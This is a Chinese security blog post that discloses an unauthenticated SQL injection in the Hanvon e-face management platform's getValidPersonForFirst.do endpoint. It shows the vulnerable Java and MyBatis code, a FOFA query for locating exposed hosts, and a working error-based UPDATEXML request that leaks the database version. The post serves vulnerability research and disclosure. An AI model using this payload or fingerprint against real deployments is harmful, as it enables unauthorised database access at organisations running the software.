---
title: "汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getValidPersonForFirst-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getvalidpersonforfirst.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/19 09:27
* 870浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

SQL

软件

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getValidPersonForFirst.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

安全

计算机安全

身份验证

直接看 `FirstPeopleOpenController` 里关于 `getValidPersonForFirst` 的实现

```
@RequestMapping(
        value = {"getValidPersonForFirst.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getValidPersonForFirst(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String key, @RequestParam(required = false) Long departmentId, @RequestParam(required = false) Long groupId, @RequestParam(value = "idsNotIn[]",required = false) Integer[] idsNotIn, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        EmployeeGroupParam employeeGroupParam = new EmployeeGroupParam();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (null != key) {
                employeeGroupParam.setKey(key);
            }

            if (null != departmentId) {
                employeeGroupParam.setDepartmentId(departmentId);
            }

            if (null != groupId) {
                employeeGroupParam.setGroupId(groupId);
            }

            PageHelper.startPage(page, pageSize);
            employeeGroupParam.setColumnKey(columnKey);
            employeeGroupParam.setOrder(order);
            List<EmployeeGroupEmployee> eges = this.firstPeopleOpenAsm.selectValidPerson(employeeGroupParam, idsNotIn);
            PageInfo<EmployeeGroupEmployee> info = new PageInfo(eges);
```

深入探索

认证

数据库

网络安全课程

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessFirstOpenDoorDao.xml

代码安全审计

```
<select id="selectValidPerson" resultType="com.hanvon.iface.tpm.access.EmployeeGroupEmployee">
    select EI.NG_ID id,EI.SZ_EMPLOY_ID AS attendanceCode,EI.SZ_NAME name,EI.NT_GENDER,EI.SZ_TELEPHONE phone, ED.NG_ID AS departmentId, ED.SZ_NAME AS departmentName
    from SYS_USER EI
    left join SYS_USER_BRANCH sub on EI.NG_ID = sub.NG_USER_ID
    left join SYS_BRANCH ED on ED.NG_ID=sub.NG_BRANCH_ID
    where EI.NT_USER_STATE = 1  AND
    EI.NG_ID not in (select EMPLOYEE_ID from ACCESS_FIRST_OPEN_EMPLOYEE AFOE WHERE AFOE.DOOR_ID = #{groupId})
    <if test="idsNotIn != null">
      AND EI.NG_ID not in
      <foreach close=")" collection="idsNotIn" index="index" item="item" open="(" separator=",">
        #{item}
      </foreach>
    </if>
    <if test="departmentId != null">
      AND ED.SZ_BRANCH_PATH like CONCAT((SELECT SZ_BRANCH_PATH from SYS_BRANCH WHERE NG_ID = #{departmentId,jdbcType=INTEGER}), '%')
    </if>
    <if test="key != null and key != ''">
      and ( EI.SZ_NAME like concat("%", #{key},"%")
      or  EI.SZ_EMPLOY_ID like concat("%", #{key},"%") or  EI.SZ_TELEPHONE like concat("%", #{key},"%"))
    </if>
    order by
    <if test="order == null or order == ''">
      EI.SZ_EMPLOY_ID + 0 asc
    </if>
    <if test="order != null and order != ''">
      <if test="columnKey == 'attendanceCode' or columnKey == 'ATTENDANCE_CODE'">
        EI.SZ_EMPLOY_ID + 0 ${order}
      </if>
      <if test="columnKey != 'attendanceCode' and columnKey != 'ATTENDANCE_CODE'">
        ${columnKey} ${order}
      </if>
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/firstPeopleOpen/getValidPersonForFirst.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞](images/img-001-873086f088ed.webp)](https://image.mrxn.net/a300ea6842fe4419bb24117baa6700dd.webp)

成功利用报错注入获取到数据版本号

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-getValidPersonForFirst-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-getValidPersonForFirst-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getValidPersonForFirst-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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